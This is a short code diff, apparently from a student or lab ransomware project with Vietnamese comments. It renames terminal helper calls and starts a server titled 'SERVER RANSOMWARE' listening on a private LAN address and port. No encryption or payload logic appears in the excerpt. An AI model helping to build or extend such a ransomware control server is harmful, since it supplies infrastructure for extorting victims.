@@ -57,13 +57,14 @@ class Server:
 
 
 # Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
+# Run: python -m test.server
 if __name__ == '__main__':
     Terminal = System()
     try:
-        Terminal.clear()
-        Terminal.title('SERVER RANSOMWARE')
-        Terminal.size(320, 240)
-        Terminal.init()
+        Terminal.Init()
+        Terminal.Clear()
+        Terminal.Title('SERVER RANSOMWARE')
+        Terminal.Size(320, 240)
         Server('192.168.1.12', 19100).Listening()
     except Exception as error:
         Console('127.0.0.0', error, 'Red')
